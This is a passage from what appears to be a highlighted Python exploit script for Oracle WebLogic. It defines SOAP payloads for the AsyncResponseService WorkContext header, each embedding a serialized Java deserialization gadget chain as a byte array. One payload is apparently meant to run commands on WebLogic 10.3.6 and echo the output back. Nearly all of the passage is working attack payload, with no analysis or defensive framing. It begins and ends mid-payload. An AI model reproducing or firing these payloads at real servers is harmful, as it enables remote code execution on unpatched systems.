index="6558"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6559"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6560"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6561"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6562"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6563"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6564"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6565"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6566"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6567"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6568"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6569"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6570"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6571"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6572"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6573"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6574"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6575"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6576"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6577"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6578"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6579"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="6580"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6581"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6582"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6583"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6584"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6585"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6586"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="6587"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6588"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6589"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6590"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6592"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6593"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6594"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6595"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6596"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6597"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6598"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6599"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6600"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6601"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6602"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6603"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6604"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6605"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6606"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6607"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6608"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6609"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6610"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6611"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6612"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6613"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6614"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6615"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6616"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="6617"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6618"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6619"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6620"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6621"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6622"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6623"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6624"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6625"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6626"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6627"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6628"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6629"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6630"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6631"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6632"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6633"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6634"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6635"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6636"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="6637"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6638"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6639"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6640"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6641"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6642"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6643"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="6644"&gt; &lt;byte&gt;-54&lt;/byte&gt;&lt;/void&gt;&lt;void index="6645"&gt; &lt;byte&gt;-11&lt;/byte&gt;&lt;/void&gt;&lt;void index="6646"&gt; &lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6647"&gt; &lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="6648"&gt; &lt;byte&gt;-53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6649"&gt; &lt;byte&gt;126&lt;/byte&gt;&lt;/void&gt;&lt;void index="6650"&gt; &lt;byte&gt;-91&lt;/byte&gt;&lt;/void&gt;&lt;void index="6651"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6653"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6654"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6656"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6657"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6658"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6659"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6660"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6661"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6662"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6663"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6664"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6665"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6666"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6667"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6668"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6669"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6671"&gt; &lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6672"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6673"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6674"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6675"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6676"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6677"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6678"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6679"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6680"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6681"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6682"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6683"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="6684"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6685"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6686"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="6687"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6689"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6690"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6691"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="6692"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6693"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6694"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6696"&gt; &lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="6697"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6698"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6699"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6700"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6701"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6702"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6703"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6704"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6705"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6706"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6707"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6708"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6709"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6710"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6711"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6712"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6713"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="6714"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6715"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6716"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6717"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6719"&gt; &lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="6720"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6721"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6722"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6723"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6724"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6725"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6726"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6727"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6728"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6729"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6730"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="6731"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6732"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6733"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6734"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="6735"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6736"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6737"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6738"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6739"&gt; &lt;byte&gt;-38&lt;/byte&gt;&lt;/void&gt;&lt;void index="6740"&gt; &lt;byte&gt;-63&lt;/byte&gt;&lt;/void&gt;&lt;void index="6741"&gt; &lt;byte&gt;-61&lt;/byte&gt;&lt;/void&gt;&lt;void index="6742"&gt; &lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="6743"&gt; &lt;byte&gt;96&lt;/byte&gt;&lt;/void&gt;&lt;void index="6744"&gt; &lt;byte&gt;-47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6745"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6747"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6748"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6750"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6751"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6752"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6753"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6754"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6755"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6756"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6757"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6758"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6759"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6760"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6761"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6763"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="6764"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6765"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6766"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6767"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6768"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6769"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6770"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6771"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6772"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6773"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6774"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6775"&gt; &lt;byte&gt;63&lt;/byte&gt;&lt;/void&gt;&lt;void index="6776"&gt; &lt;byte&gt;64&lt;/byte&gt;&lt;/void&gt;&lt;void index="6782"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6783"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="6784"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="6788"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6792"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6793"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6795"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="6796"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6797"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6798"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6799"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6800"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6801"&gt; &lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="6802"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="6803"&gt; &lt;byte&gt;56&lt;/byte&gt;&lt;/void&gt;&lt;void index="6804"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="6806"&gt; &lt;byte&gt;126&lt;/byte&gt;&lt;/void&gt;&lt;void index="6808"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="6809"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6810"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6811"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6813"&gt; &lt;byte&gt;29&lt;/byte&gt;&lt;/void&gt;&lt;void index="6814"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6815"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6816"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6817"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6818"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6819"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6820"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6821"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6822"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6823"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6824"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6825"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6826"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6827"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6828"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6829"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6830"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6831"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6832"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6833"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6834"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="6835"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6836"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6837"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6838"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6839"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6840"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6841"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6842"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6854"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6855"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6856"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;  &lt;/array&gt; </span></span><br><span class="line"><span class="string">&lt;/void&gt;&lt;/class&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">echo_cmd_payload_10_3_6_2 = <span class="string">"""&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;</span></span><br><span class="line"><span class="string">  &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span></span><br><span class="line"><span class="string">      &lt;java&gt;</span></span><br><span class="line"><span class="string">      &lt;array method="forName"&gt;</span></span><br><span class="line"><span class="string">       &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;void&gt;</span></span><br><span class="line"><span class="string"> &lt;array class="byte" length="6862"&gt;&lt;void index="0"&gt;&lt;byte&gt;-84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1"&gt;&lt;byte&gt;-19&lt;/byte&gt;&lt;/void&gt;&lt;void index="3"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="4"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="7"&gt;&lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="8"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="9"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="10"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="11"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="12"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="13"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="14"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="15"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="16"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="17"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="18"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="19"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="20"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="21"&gt;&lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="22"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="23"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="24"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="25"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="26"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="27"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="28"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="29"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="30"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="31"&gt;&lt;byte&gt;-40&lt;/byte&gt;&lt;/void&gt;&lt;void index="32"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="33"&gt;&lt;byte&gt;-41&lt;/byte&gt;&lt;/void&gt;&lt;void index="34"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="35"&gt;&lt;byte&gt;-107&lt;/byte&gt;&lt;/void&gt;&lt;void index="36"&gt;&lt;byte&gt;-35&lt;/byte&gt;&lt;/void&gt;&lt;void index="37"&gt;&lt;byte&gt;42&lt;/byte&gt;&lt;/void&gt;&lt;void index="38"&gt;&lt;byte&gt;30&lt;/byte&gt;&lt;/void&gt;&lt;void index="39"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="42"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="43"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="45"&gt;&lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="46"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="47"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="48"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="49"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="50"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="51"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="52"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="53"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void 